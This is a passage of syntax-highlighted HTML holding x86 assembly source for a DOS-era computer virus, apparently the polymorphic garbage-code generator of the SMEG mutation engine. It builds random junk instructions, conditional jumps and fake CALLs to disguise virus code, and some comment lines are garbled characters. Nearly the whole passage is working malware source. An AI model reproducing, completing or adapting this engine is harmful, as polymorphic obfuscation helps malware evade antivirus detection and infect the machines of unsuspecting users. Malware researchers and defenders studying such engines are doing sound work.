        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; is it one of the garbage</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">9h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; if so, we are done</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">choose_reg_done</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">9h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; ax,cx,dx, or bx?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">werd</span><span class="sc0">                    </span><span class="sc1">; to yer muthah!</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; pop off return location</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                             </span><span class="sc1">; go to caller's caller</span><span class="sc0">
</span><span class="sc5">werd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; make either byte or word</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; register</span><span class="sc0">
</span><span class="sc5">choose_reg_done</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">garble_once</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">                 </span><span class="sc1">; randomly go to either</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">other_garble</span><span class="sc0">            </span><span class="sc1">; here ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">branch_garble</span><span class="sc0">           </span><span class="sc1">; ... or here</span><span class="sc0">
</span><span class="sc5">not_branch_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
</span><span class="sc5">other_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">larger_instr</span><span class="sc0">            </span><span class="sc1">; mostly do larger instructions</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">do_one_byte</span><span class="sc0">             </span><span class="sc1">; 1/16 chance</span><span class="sc0">
        </span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
        </span><span class="sc1">;с貰pº ‘レ溫 Þ飡p丞與ⅸ</span><span class="sc0">
</span><span class="sc5">larger_instr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">                  </span><span class="sc1">; normalise random number</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">garble_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">    </span><span class="sc1">;AX=DS:[SI]             ; get table entry</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; keep it in CX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; pick out the bottom</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; mask out low 2 bits</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_dx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; byte for variable opcodes</span><span class="sc0">
                                         </span><span class="sc1">; (e.g. allows byte &amp; word</span><span class="sc0">
                                         </span><span class="sc1">;  forms of opcode to use the</span><span class="sc0">
                                         </span><span class="sc1">;  same table entry)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                 </span><span class="sc1">; mask out mod field</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                 </span><span class="sc1">; does it indicate register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; operation? i.e. 2 regs</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">no_memory</span><span class="sc0">               </span><span class="sc1">; if so, branch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_reg_mask</span><span class="sc0">            </span><span class="sc1">; otherwise, process memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; and register operation</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                 </span><span class="sc1">; clear all but top 2 bits</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; fill in the field</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; generate the registers to use</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                   </span><span class="sc1">; in memory access,i.e. [bx+si]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; patch into 2nd byte of instr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">fill_in_rm</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">force_byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                   </span><span class="sc1">; alter mask to choose AX or DX</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fill_in_rm</span><span class="sc0">
</span><span class="sc5">force_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; change to byte data</span><span class="sc0">
                                         </span><span class="sc1">; "byte sized"</span><span class="sc0">
</span><span class="sc5">fill_in_rm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">choose_register</span><span class="sc0">         </span><span class="sc1">; move register into</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; the rm field</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">finish_larger</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; combine data</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; move it to the right register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; reverse byte order</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                            </span><span class="sc1">; write the instruction</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; needs data bytes?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">needs_data</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">needs_data</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                   </span><span class="sc1">; check length of instruction</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">do_data_bytes</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">do_data_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; keep the random number</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; under 40h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                            </span><span class="sc1">; write the byte</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc0">                      </span><span class="sc1">; decrement bytes to write</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">do_data_bytes</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">no_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_reg_mask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">choose_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; get the opcode and clear the</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">                 </span><span class="sc1">; size bit for now</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">not_NOT_NEG</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; is it TEST instruction?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">not_NOT_NEG</span><span class="sc0">             </span><span class="sc1">; if it is, go find the number</span><span class="sc0">
                                         </span><span class="sc1">; of data bytes it needs, else</span><span class="sc0">
                                         </span><span class="sc1">; it is NOT or NEG, so there're</span><span class="sc0">
</span><span class="sc5">no_data_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; no data bytes</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finish_larger</span><span class="sc0">
</span><span class="sc5">not_NOT_NEG</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">                  </span><span class="sc1">; is it a shift or rotate?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">set_data_length</span><span class="sc0">         </span><span class="sc1">; if not, calculate # data</span><span class="sc0">
                                         </span><span class="sc1">; bytes needed, else</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_data_bytes</span><span class="sc0">     </span><span class="sc1">; we don't need any</span><span class="sc0">
</span><span class="sc5">set_data_length</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; byte or word of data?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; assume word</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">finish_larger</span><span class="sc0">           </span><span class="sc1">; continue if so</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc0">                      </span><span class="sc1">; DEC DX is better!!!</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finish_larger</span><span class="sc0">     </span><span class="sc1">; otherwise adjust to data</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">do_one_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">onebyte_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                   </span><span class="sc1">; DEC?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">inc_or_dec</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                   </span><span class="sc1">; or INC?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">encode_1byte</span><span class="sc0">
</span><span class="sc5">inc_or_dec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; get a garbage register</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">)</span><span class="sc0">
                                         </span><span class="sc1">; can we say "lea", boys and</span><span class="sc0">
                                         </span><span class="sc1">; girls?</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">                             </span><span class="sc1">; look up the register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; fill in the register field</span><span class="sc0">
</span><span class="sc5">encode_1byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">branch_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there an unfinished</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">no_pending_cJMP</span><span class="sc0">            </span><span class="sc1">; conditional jmp?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">finish_cJMP</span><span class="sc0">                </span><span class="sc1">; if so, finish it</span><span class="sc0">
</span><span class="sc5">no_pending_cJMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6Eh</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">do_near_JMP</span><span class="sc0">
</span><span class="sc5">do_cond_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                   </span><span class="sc1">; encode a conditional</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                   </span><span class="sc1">; jmp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; save target offset</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">do_near_JMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there an unfinished</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">do_cond_jmp</span><span class="sc0">                </span><span class="sc1">; near JMP pending?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">              </span><span class="sc1">; if not, encode one</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                     </span><span class="sc1">; either just jmp past</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">encode_CALL</span><span class="sc0">                </span><span class="sc1">; or call it too</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                    </span><span class="sc1">; encode near JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; save location to patch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">forward_CALL</span><span class="sc0">
</span><span class="sc5">go_not_branch_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">not_branch_garble</span><span class="sc0">
</span><span class="sc5">forward_CALL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_CALL</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there a garbage CALL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">go_not_branch_garble</span><span class="sc0">      </span><span class="sc1">; we can patch?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                        </span><span class="sc1">; if there is, patch the CALL</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; for here so there are CALLs</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; forwards as well as back-</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; wards</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_CALL</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">not_branch_garble</span><span class="sc0">
</span><span class="sc5">encode_CALL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CALL_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; is there one pending?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">do_cond_jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">                    </span><span class="sc1">; encode a CALL</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_CALL</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">store_CALL_loc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">              </span><span class="sc1">; 1/2 chance of replacing</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                      </span><span class="sc1">; it (random so it's not</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">                      </span><span class="sc1">; too predictable)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">fill_in_offset</span><span class="sc0">
</span><span class="sc5">store_CALL_loc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_CALL</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; save ptr to CALL offset</span><span class="sc0">
</span><span class="sc5">fill_in_offset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; calculate CALL offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CALL_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span></div></body>
</html>
